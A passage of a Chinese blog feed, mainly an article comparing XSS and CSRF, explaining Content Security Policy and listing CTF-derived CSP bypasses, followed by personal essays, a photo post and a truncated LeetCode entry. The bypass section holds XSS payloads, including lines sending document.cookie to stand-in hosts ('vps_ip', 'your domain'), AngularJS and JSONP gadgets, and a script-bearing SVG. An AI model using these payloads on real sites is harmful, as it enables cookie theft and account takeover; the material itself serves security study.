title="利用"></a>利用</h4><ul><li>XSS通过诱导受害者点击恶意链接或诱导服务器恶意渲染恶意代码来窃取登录信息、cooki、执行服务端命令等。而CSRF则是通过受害者点击恶意链接，重点是利用其身份发起一系列HTTP请求。二者都能到到啊一种类似于越权的效果。</li><li>CSRF攻击的范围有限，仅限于用户可以执行的操作，例如点击恶意链接或访问恶意网站。相反，XSS攻击提供执行恶意脚本来执行攻击者所选择的任何活动，扩大了攻击的范围。</li><li>XSS攻击遵循双向攻击模式，允许攻击者执行恶意脚本、访问响应，并将后续敏感数据发送到攻击者选择的目的地。而CSRF是一种单向攻击机制，这意味着攻击者只能发起HTTP请求，但不能检索已发起请求的响应。</li></ul><h4 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h4><p>XSS主要是通过绕过网站对输入的编码，黑名单等限制，从而成功的把代码注入进客户端或者存储进服务器中。而CSRF要考虑的首要问题是解决浏览器第三方cookie访问的问题，通过Refer源Bypass，Token Bypass，X-Request-with Bypass等绕过浏览器和服务器的检查从而实现跨站的请求伪造。</p><h4 id="防护-2"><a href="#防护-2" class="headerlink" title="防护"></a>防护</h4><p>XSS防护主要是降低用户端对服务端之间的双向信任，加强对用户输入和服务端输出的校验。主要手段是加强各种编码和转义，添加黑白名单，使用Http only等。</p><p>而CSRF防护主要是解决浏览器第三方cookie访问限制的问题，具体方法是添加HTTP Referer 字段验证， 添加HTTP 头中自定义属性防护，使用完备的 token，启用 SameSite cooki，使用验证码等。</p><h1 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h1><p><strong>内容安全策略 CSP</strong>（Content-Security-Policy）是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本（XSS）和数据注入攻击等。</p><p>CSP 被设计成完全向后兼容（除 CSP2 在向后兼容有明确提及的不一致; ）。不支持 CSP 的浏览器也能与实现了 CSP 的服务器正常工作，反之亦然：不支持 CSP 的浏览器只会忽略它，如常运行，默认为网页内容使用标准的同源策略。如果网站不提供 CSP 标头，浏览器也使用标准的同源策略。</p><h3 id="威胁"><a href="#威胁" class="headerlink" title="威胁"></a>威胁</h3><h4 id="防止XSS攻击"><a href="#防止XSS攻击" class="headerlink" title="防止XSS攻击"></a>防止XSS攻击</h4><p>XSS 攻击利用了浏览器对于从服务器所获取的内容的信任。恶意脚本在受害者的浏览器中得以运行。</p><p>CSP 通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除 XSS 攻击所依赖的载体。一个 CSP 兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本（包括内联脚本和 HTML 的事件处理属性）。</p><p>作为一种终极防护形式，始终不允许执行脚本的站点可以选择全面禁止脚本执行。</p><p><strong><code>CSP</code> 的实质就是白名单制度</strong>，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。严格规定页面中哪些资源允许有哪些资源，不在指定范围内的统统拒绝。它的实现和执行全部由浏览器完成，开发者只需提供配置。因此CSP大大增强的网页的安全性，攻击者即使发现了漏洞也没办法注入脚本，除非能想办法绕过白名单限制。</p><h4 id="缓解数据包嗅探攻击"><a href="#缓解数据包嗅探攻击" class="headerlink" title="缓解数据包嗅探攻击"></a>缓解数据包嗅探攻击</h4><p>除限制可以加载内容的域，服务器还可指明哪种协议允许使用；比如（从理想化的安全角度来说），服务器可指定所有内容必须通过 HTTPS 加载。一个完整的数据安全传输策略不仅强制使用 HTTPS 进行数据传输，也为所有的 cookie 标记 <code>secure</code> 标识，并且提供自动的重定向使得 HTTP 页面导向 HTTPS 版本。网站也可以使用 <code>Strict-Transport-Security</code> HTTP 标头确保连接它的浏览器只使用加密通道。</p><h3 id="使用CSP"><a href="#使用CSP" class="headerlink" title="使用CSP"></a>使用CSP</h3><p>第一种是配置内容安全策略涉及到添加 <code>Content-Security-Policy</code> HTTP 标头到一个页面，并配置相应的值，以控制用户代理（浏览器等）可以为该页面获取哪些资源。第二种是通过网页的meta标签。</p><p>CSP可以由两种方式指定： HTTP Header 和 HTML。</p><ul><li><p>通过定义在HTTP header 中使用：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>策略集</span><br></pre></td></tr></table></figure></li><li><p>通过定义在 HTML meta标签中使用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-security-policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;策略集&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="Content-Security-Policy方式举例"><a href="#Content-Security-Policy方式举例" class="headerlink" title="Content-Security-Policy方式举例"></a>Content-Security-Policy方式举例</h4><ul><li><p>一个网站管理者想要所有内容均来自站点的同一个源（不包括其子域名）。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure></li><li><p>一个网站管理者允许内容来自信任的域名及其子域名（域名不必须与 CSP 设置所在的域名相同）。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27; *.trusted.com</span><br></pre></td></tr></table></figure></li><li><p>一个网站管理者允许网页应用的用户在他们自己的内容中包含来自任何源的图片，但是限制音频或视频需从信任的资源提供者，所有脚本必须从特定主机服务器获取可信的代码。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;; img-src *; media-src media1.com media2.com; script-src userscripts.example.com</span><br></pre></td></tr></table></figure><p>在这里，各种内容默认仅允许从文档所在的源获取，但存在如下例外：</p><ul><li>图片可以从任何地方加载 (注意“*”通配符)。</li><li>多媒体文件仅允许从 media1.com 和 media2.com 加载（不允许从这些站点的子域名）。</li><li>可运行脚本仅允许来自于 userscripts.example.com。</li></ul></li><li><p>一个管理者想要确保网站的所有内容都要通过 SSL 方式获取，以避免攻击者窃听用户发出的请求。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src https://onlinebanking.jumbobank.com</span><br></pre></td></tr></table></figure><p>该服务器仅允许通过 HTTPS 方式并仅从 onlinebanking.jumbobank.com 域名来访问文档。</p></li></ul><h4 id="meta标签举例"><a href="#meta标签举例" class="headerlink" title="meta标签举例"></a>meta标签举例</h4><ul><li>允许自身css、js和高德地图api、地图数据。</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27; https://webapi.amap.com https://restapi.amap.com https://vdata.amap.com https://appx/web-view.min.js;worker-src blob:&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>总结：两种方式本质都是通过Content-Security-Policy来：</p><p>​1.配置允许的域名子域名。</p><p>​2.限制只能通过SSL方式获取</p><h4 id="指令说明："><a href="#指令说明：" class="headerlink" title="指令说明："></a>指令说明：</h4><blockquote><p>资源加载限制</p></blockquote><ul><li>**<code>script-src</code>**：外部脚本</li><li>**<code>style-src</code>**：样式表</li><li>**<code>img-src</code>**：图像</li><li>**<code>media-src</code>**：媒体文件（音频和视频）</li><li>**<code>font-src</code>**：字体文件</li><li>**<code>object-src</code>**：插件（比如 Flash）</li><li>**<code>child-src</code>**：框架</li><li>**<code>frame-ancestors</code>**：嵌入的外部资源（比如<code>&lt;frame&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;embed&gt;</code>和<code>&lt;applet&gt;</code>） </li><li>**<code>connect-src</code>**：HTTP 连接（通过 XHR、WebSockets、EventSource等）</li><li>**<code>worker-src</code>**：<code>worker</code>脚本</li><li>**<code>manifest-src</code>**：manifest 文件</li></ul><blockquote><p>default-src</p></blockquote><p><code>default-src</code>用来设置上面各个选项的默认值。如：default-src ‘self’–&gt;限制<strong>所有的</strong>外部资源，都只能从当前域名加载。</p><blockquote><p>其他限制</p></blockquote><ul><li>**<code>block-all-mixed-content</code>**：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</li><li>**<code>upgrade-insecure-requests</code>**：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</li><li>**<code>plugin-types</code>**：限制可以使用的插件格式</li><li>**<code>sandbox</code>**：浏览器行为的限制，比如不能有弹出窗口等。</li></ul><hr><h3 id="绕过CSP"><a href="#绕过CSP" class="headerlink" title="绕过CSP"></a>绕过CSP</h3><p>看起来如果要继续尝试XSS的话第一步就是先突破CSP对跨域访问的限制。</p><p>找了几种尝试绕过的方法：</p><h4 id="location-href"><a href="#location-href" class="headerlink" title="location.href"></a>location.href</h4><p>CSP不影响location.href跳转，因为当今大部分网站的跳转功能都是由前端实现的，CSP如果限制跳转会影响很多的网站功能。所以，用跳转来绕过CSP获取数据是一个万能的办法，虽然比较容易被发现，但是在大部分情况下对于我们已经够用<br> 当我们已经能够执行JS脚本的时候，但是由于CSP的设置，我们的cookie无法带外传输，就可以采用此方法，将cookie打到我们的vps上</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = &quot;vps_ip:xxxx?&quot;+document.cookie</span><br></pre></td></tr></table></figure><p>此种绕过方式适用于：已经能够执行JS脚本，需要外带数据的情况。</p><blockquote><p>关于此种情况还有一种基于Link标签的绕过，但是好像比较古老现在大部分浏览器已经约束此标签导致不适用了</p></blockquote><h4 id="Iframe绕过"><a href="#Iframe绕过" class="headerlink" title="Iframe绕过"></a>Iframe绕过</h4><p>当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，可以说A页面的CSP防护完全失效</p><p>有点类似于CSRF的感觉：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- B页面 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">iframe.<span class="property">src</span>=<span class="string">&quot;A页面&quot;</span>;   <span class="comment">//通过iframe来操作</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span></span><br><span class="line"><span class="language-javascript"><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span><span class="title function_">alert</span>(iframe.<span class="property">contentWindow</span>.<span class="property">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;flag&#x27;</span>).<span class="property">innerHTML</span>),<span class="number">1000</span>);    <span class="comment">//setTimeout是为了留时间给iframe加载</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="jsonp绕过"><a href="#jsonp绕过" class="headerlink" title="jsonp绕过"></a>jsonp绕过</h4><p>大部分站点的jsonp是完全可控的，只不过有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置x-content-type-options头，否者尽管返回类型不一致，浏览器依旧会当成js进行解析<br> 以ins’hack 2019&#x2F;的bypasses-everywhere这道题为例，题目中的csp设置了<a href="http://www.google.com/">www.google.com</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src www.google.com; img-src *; default-src &#x27;none&#x27;; style-src &#x27;unsafe-inline&#x27;</span><br></pre></td></tr></table></figure><p>看上去非常天衣无缝，但是google站点存在了用户可控jsonp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src https://www.google.com&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.google.com/complete/search？client=chrome&amp;q=hello&amp;callback=alert&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配合注释符，我们即可执行任意js<br> 下面是一些存在用户可控资源或者jsonp比较常用站点的github项目<br> <a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a><br> 利用条件:</p><ol><li>站点存在可控Jsonp</li><li>站点在CSP白名单中</li></ol><h4 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h4><p>一般来说，前端会用到许多的前端框架和库，部分企业为了减轻服务器压力或者其他原因，可能会<strong>引用其他CDN上的JS框架</strong>，如果<strong>CDN上存在一些低版本的框架</strong>，就可能存在绕过CSP的风险</p><blockquote><p>举例</p></blockquote><ul><li>某个案例中hackmd里的CSP引用了cloudflare.com CDN服务，于是采用低版本的angular js模板注入来绕过CSP，如下</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://cdnjs.cloudflare.com;&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- foo=&quot;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line">    &#123;&#123;constructor.constructor(&#x27;alert(document.cookie)&#x27;)()&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>例如假设页面中使用了Jquery-mobile库，并且CSP策略中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，那么下面的向量就可以绕过CSP：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-role</span>=<span class="string">popup</span> <span class="attr">id</span>=<span class="string">&#x27;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>还有一些库也可以被利用，例如RCTF2018中遇到的amp库，下面的标签可以获取名字为FLAG的cookie</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">amp-pixel</span> <span class="attr">src</span>=<span class="string">&quot;http://your domain/?cid=CLIENT_ID(FLAG)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">amp-pixel</span>&gt;</span>  </span><br></pre></td></tr></table></figure></li></ul><p>补充：<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf">blackhat2017有篇ppt总结了可以被用来绕过CSP的一些JS库</a></p><h4 id="SVG绕过"><a href="#SVG绕过" class="headerlink" title="SVG绕过"></a>SVG绕过</h4><p>SVG作为一个矢量图，但是却能够执行javascript脚本，如果页面中存在上传功能，并且没有过滤svg，那么可以通过上传恶意svg图像来xss</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;no&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">svg</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD SVG 1.1//EN&quot;</span> <span class="string">&quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">id</span>=<span class="string">&quot;Layer_1&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0px&quot;</span> <span class="attr">y</span>=<span class="string">&quot;0px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100px&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 751 751&quot;</span> <span class="attr">enable-background</span>=<span class="string">&quot;new 0 0 751 751&quot;</span> <span class="attr">xml:space</span>=<span class="string">&quot;preserve&quot;</span>&gt;</span>  <span class="tag">&lt;<span class="name">image</span> <span class="attr">id</span>=<span class="string">&quot;image0&quot;</span> <span class="attr">width</span>=<span class="string">&quot;751&quot;</span> <span class="attr">height</span>=<span class="string">&quot;751&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">href</span>=<span class="string">&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>   //注入javasript</span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="CRLF绕过"><a href="#CRLF绕过" class="headerlink" title="CRLF绕过"></a>CRLF绕过</h4><p>HCTF2018的一道题，当一个页面存在CRLF漏洞时，且我们的可控点在CSP上方，就可以通过注入回车换行，将CSP挤到HTTP返回体中，这样就绕过了CSP<br> <a href="https://github.com/Lou00/HCTF2018_Bottle">原题github</a></p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>还有其他的绕过方式，多出现在国外的很多CTF比赛中</p><ul><li>站点可控静态资源绕过</li><li>Base-uri绕过</li><li>不完整script标签绕过nonce</li><li>object-src绕过（PDFXSS）</li><li>不完整的资源标签获取资源</li><li>CSS选择器获取内容</li></ul><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><strong>内容安全策略 CSP</strong>确实在一定程度上检测并削弱某些特定类型的攻击，特别是XSS和数据注入攻击等前端攻击，进一步加强了浏览器的同源策略。但是也需要开发者正确严格配置，同时绕过方式也很多。很多实战场景下直接利用location.href或者其他同站点的跳转就能成功绕过。但是其利用白名单杜绝注入脚本的思路非常正确。</p><h1 id="关于前端安全的一些思考"><a href="#关于前端安全的一些思考" class="headerlink" title="关于前端安全的一些思考"></a>关于前端安全的一些思考</h1><p>前端安全看似危害很小但是很多时候往往是一个网站乃至整个域溃败的第一步。而XSS和CSRF又是前端安全问题的主要重灾区。二者在原理上有很多共性也有很多区别。</p><p>XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。归根到底就是一个信任问题，站在防护的角度，自然是尽可能的降低浏览器、客户端、服务端各自之间的信任度。或者说，严格校验这三方之间交互的过程中数据的可信度。编码，转义，增加登录验证token验证，CSP限制跨域等等都是为了实现这个问题。然而站在业务的角度上考虑，在这验证过程中又要加上用户体验感和网站服务度的考量，最终应该是各个角度综合考虑下的折中方案。</p><p>总而言之，CSP策略的完善，加强同源策略的实施；和研究更加完备的方案进制第三方cookie的滥用，将是一个任重而道远的任务。</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>喝酒为了醉，抽烟为了醒</title>
      <link href="/2023/12/19/%E5%96%9D%E9%85%92%E4%B8%BA%E4%BA%86%E9%86%89%EF%BC%8C%E6%8A%BD%E7%83%9F%E4%B8%BA%E4%BA%86%E9%86%92/"/>
      <url>/2023/12/19/%E5%96%9D%E9%85%92%E4%B8%BA%E4%BA%86%E9%86%89%EF%BC%8C%E6%8A%BD%E7%83%9F%E4%B8%BA%E4%BA%86%E9%86%92/</url>
      
        <content type="html"><![CDATA[<p>那是我第一次真正意义上的吸烟。之前抽过很多烟，各种各样的，但都没能真正的吸进去，烟吸到口腔里，吞进去，或者直接吐出来，并没有真正过肺。可当我第一次把烟吸进肺里，尼古丁穿过细胞进入血液，流淌至全身。该怎么形容那种感觉呢，我缩在窗前，整个人颤抖着，不知道是因为冷还是因为兴奋，一边害怕一边大口的吸着，刚开始的两口有点呛人，有点苦涩，多吸两口之后，百乐的红酒味从肺里散开，甚至忘了抖动烟灰，我看着有点像夕阳的火光，和已经冷掉的烟头，想起了还没做的腾讯笔试，想起了曾经在酒吧里的醉生梦死。我真的有点不明白了。</p><p>原来这就是尼古丁的威力，曾经看过教科书里旧时代人们吸食鸦片的照片，我突然感觉体会到了那种前所未有的快感，这让我恐惧，虽然我只是想要清醒，但我颤抖着双手，擦着掉落在家里干净的地板上的烟灰，颤抖着双手，冲进卫生间，疯狂漱口，疯狂刷牙，然后小心翼翼的藏起作案工具。大口的深呼吸，大口的掠夺空气中的二氧化碳。</p><p>我不知道这是怎么了，这到底是是怎么了。清醒和醉都是我想要的，都不是我想要的，我只想生活的强烈一些，没有爱情就用药物或者别的什么填满空虚，手上的烟味怎么也洗不掉，我讨厌平庸，讨厌自己。身体和灵魂好像都交出去了。</p><p>小猫咪眼中有爱情吗，在爱上一只猫之后被主人抓去被迫和另一只不认识的猫交配，不交配就会发情，就会痛苦，就会惹主人生气。可是万一她已经爱上其他的猫了呢。我好像又听到了嚎叫的声音，是发情，还是痛苦呢。</p><p>没有人在意就连她自己，也不过是受着身欲望的支配。</p><p>那么，那么你又怎么能说爱情是至高无上的呢。你又怎么能觉得爱情是一定存在于这个世界上的。我总是觉得我曾经爱过的人，都不会真正的爱上一个人，可是我呢，我又真的能真正爱上某个人吗。曾经不相信爱情，但是坚信自己会遇见对的人，现在发现大家好像都没遇见，我又凭什么遇见。可我想起那些眼神的闪躲，那些小心翼翼的气息，还有突然有了意义的文字。不可否认的是我确实曾经历过一些难忘的事情，但那对现在的我来说都太遥远了，我开始变了。从喝酒的时候开始，从抽烟的时候开始，我变得好陌生，我开始变成曾经喜欢的人的模样。我想到了他的眼神，也许我一辈子都看不透，结果我连自己也看不透。</p>]]></content>
      
      
      <categories>
          
          <category> 文学 </category>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>南京</title>
      <link href="/2023/12/10/%E5%8D%97%E4%BA%AC/"/>
      <url>/2023/12/10/%E5%8D%97%E4%BA%AC/</url>
      
        <content type="html"><![CDATA[<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/A304CC59851A2F9DA2FB3DE59E4B6ED6.jpg" alt="A304CC59851A2F9DA2FB3DE59E4B6ED6" style="zoom:33%;" /><hr><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/DBCA5E664154D7B6600819F0137C6CF2.jpg" alt="DBCA5E664154D7B6600819F0137C6CF2" style="zoom:33%;" /><hr><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/04FCDA3D1EA20E80DA3E70B40004A70C.jpg" alt="04FCDA3D1EA20E80DA3E70B40004A70C" style="zoom:33%;" /><hr><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/40E7979BC36D79DC6B8BCC51378C1073.jpg" alt="40E7979BC36D79DC6B8BCC51378C1073" style="zoom:33%;" /><hr>]]></content>
      
      
      <categories>
          
          <category> 摄影 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 摄影 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>这是我离海最近的一次</title>
      <link href="/2023/12/09/%E8%BF%99%E6%98%AF%E6%88%91%E7%A6%BB%E6%B5%B7%E6%9C%80%E8%BF%91%E7%9A%84%E4%B8%80%E6%AC%A1/"/>
      <url>/2023/12/09/%E8%BF%99%E6%98%AF%E6%88%91%E7%A6%BB%E6%B5%B7%E6%9C%80%E8%BF%91%E7%9A%84%E4%B8%80%E6%AC%A1/</url>
      
        <content type="html"><![CDATA[<p>这是我离海最近的一次。</p><p>长这么大见过的最大的东西是天空。海也是这样的吗，有多大呢，日落的时候会是橘子一样的颜色吗。好浪漫啊，他对我说浪漫的时候我只觉得难受，可浪漫本来应该是浪漫的。哪里的花店都贩卖幸福。</p><p>我想起了尼采，想到酒神巴库斯，我已经忘记他好久了可我昨晚突然想起来。第一次喝酒喝进医院的时候我向他道别，至此我虽然又再喝过很多酒，却再也没见过他了。我感到自己被抛弃，被过去的自己抛弃。日方中方睨，物方生方死。和高中的同桌在一千多公里以外的陌生街道上说着方言，试图回到曾经的模样，但我看见天空中布满耀眼的红色的层积云，而成都的日落呢，是要更加暖一点的橙黄色。</p><p>“物理竞赛”这个好像已经很古老的词从他嘴里说出来。物理，我又怎么能想到曾经爱的要死的东西如今已经完全从我的生活离开了。</p><p>想把我的二十岁还给我自己，可我真的能还给我吗，烂醉的时候我以为我短暂的逃离了世界，但我的灵魂，好像已经彻底烂透了，不知道从哪里开始修理，也没有勇气。看到那个人的博客，我感觉有点害怕。我真正需要的是什么呢，好像忘记了。</p><p>除了自己没有人能打败我，可是人天生就学会了竞争，这不能称之为错，但我不知道还有什么是对，我喜欢日出，更喜欢日落，热衷于夜晚，也幻想着橘子色的大海。</p><p>曾经喜欢的人大多在冬日出生，我也是。所以我也最喜欢冬天的太阳，冷冷的，但是足够耀眼。太热会灼伤我，太冷会让我觉得无趣。冷冷的热烈，才是恰到好处的暧昧。</p>]]></content>
      
      
      <categories>
          
          <category> 文学 </category>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode每日一题_2023_11</title>
      <link href="/2023/12/04/LeetCode%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-2023-11/"/>
      <url>/2023/12/04/LeetCode%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-2023-11/</url>
      
        <content type="html"><![CDATA[<h4 id="DAY1-2103-环和杆"><a href="#DAY1-2103-环和杆" class="headerlink" title="DAY1-2103.环和杆"></a>DAY1-2103.环和杆</h4><p><a href="https://leetcode.cn/problems/rings-and-rods/">2103. 环和杆</a></p><h6 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h6><p>&#x3D;&#x3D;简单&#x3D;&#x3D;</p><blockquote><p>总计有 <code>n</code> 个环，环的颜色可以是红、绿、蓝中的一种。这些环分别穿在 10 根编号为 <code>0</code> 到 <code>9</code> 的杆上。</p><p>给你一个长度为 <code>2n</code> 的字符串 <code>rings</code> ，表示这 <code>n</code> 个环在杆上的分布。<code>rings</code> 中每两个字符形成一个 <strong>颜色位置对</strong> ，用于描述每个环：</p><ul><li>第 <code>i</code> 对中的 <strong>第一个</strong> 字符表示第 <code>i</code> 个环的 <strong>颜色</strong>（<code>&#39;R&#39;</code>、<code>&#39;G&#39;</code>、<code>&#39;B&#39;</code>）。</li><li>第 <code>i</code> 对中的 <strong>第二个</strong> 字符表示第 <code>i</code> 个环的 